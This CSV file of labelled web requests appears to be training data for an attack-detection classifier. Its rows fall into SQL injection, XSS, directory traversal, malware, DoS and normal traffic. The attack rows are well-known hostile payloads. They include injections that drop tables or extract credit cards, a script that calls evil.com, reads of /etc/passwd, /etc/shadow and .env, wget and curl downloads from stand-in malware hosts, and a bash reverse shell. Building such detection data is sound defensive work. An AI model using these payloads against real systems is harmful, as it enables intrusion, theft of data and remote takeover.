request,label
"SELECT * FROM users WHERE id='1' OR 1=1 --","sql_injection"
"' OR '1'='1'; --","sql_injection"
"DROP TABLE users","sql_injection"
"admin' /*","sql_injection"
"' OR sleep(5)#","sql_injection"
"admin' OR '1'='1' --","sql_injection"
"' UNION SELECT creditcard FROM customers --","sql_injection"
"1 UNION SELECT null,null --","sql_injection"
"SELECT count(*) FROM users;","sql_injection"
"OR 1=1","sql_injection"
"/product?id=' OR '1'='1","sql_injection"
"/login?user=abc&pass=' OR '1'='1","sql_injection"
"/search?q=%27%20OR%201%3D1","sql_injection"
"/api/users?filter=' OR '1'--","sql_injection"
"/users?id=5 UNION SELECT * FROM admin","sql_injection"
"<script>alert('xss')</script>","xss"
"<img src=x onerror=alert('xss')>","xss"
"<svg/onload=alert('XSS')>","xss"
"<body onload=alert('hack')>","xss"
"<iframe src=javascript:alert(1)>","xss"
"/search?q=<script>alert(document.cookie)</script>","xss"
"/profile?name=<b onclick=alert(1)>hack</b>","xss"
"<input value='' onclick='alert(1)'>","xss"
"<script>fetch('http://evil.com')</script>","xss"
"<video src=x onerror=alert(1)>","xss"
"<object data=javascript:alert(1)>","xss"
"/page?html=<svg/onload=prompt(1)>","xss"
"/feedback?msg=<marquee onstart=alert(1)>","xss"
"<scr<script>ipt>alert('x')</scr<script>ipt>","xss"
"../../etc/passwd","directory_traversal"
"../../../windows/system32","directory_traversal"
"..%2F..%2F..%2Fetc/passwd","directory_traversal"
"../../../../var/log/auth.log","directory_traversal"
"/images/../../../../etc/shadow","directory_traversal"
"/download?file=../../../boot.ini","directory_traversal"
"/static/../../app/config.py","directory_traversal"
"/path/..%2f..%2f..%2fconfig.yaml","directory_traversal"
"/admin/../../database.sqlite","directory_traversal"
"../../../../.env","directory_traversal"
"wget http://malware.com/file.exe","malware"
"curl http://danger.com/payload.sh","malware"
"python -c 'import socket'","malware"
"powershell Invoke-WebRequest malicious","malware"
"GET /virus.exe","malware"
"/download?file=malware.exe","malware"
"~/startup.sh","malware"
"bash -i >& /dev/tcp/10.0.0.5/8080 0>&1","malware"
"nc -lvp 4444","malware"
"/tmp/malicious.bin","malware"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","dos"
"AAAAAAA.... (5000 chars)","dos"
"GET /login HTTP/1.1 repeated 1000x","dos"
"random junk spam spam spam spam","dos"
"//////!!!!!!!!!?????????","dos"
"AAAAAAAAAAAAAttack","dos"
"Memory Overflow Packet","dos"
"<big><big><big>AAAAAAAAAAA","dos"
"Chunk Flood","dos"
"/api/status flood","dos"
"/home","normal"
"/about","normal"
"/contact","normal"
"/products","normal"
"/login","normal"
"/logout","normal"
"/dashboard","normal"
"/api/users","normal"
"/api/orders","normal"
"/search?q=shoes","normal"
"/cart/add?id=200","normal"
"/checkout","normal"
"/profile/view","normal"
"/settings/update","normal"
"/blog/how-to-code","normal"
"/news/today","normal"
"/faq","normal"
"/privacy-policy","normal"
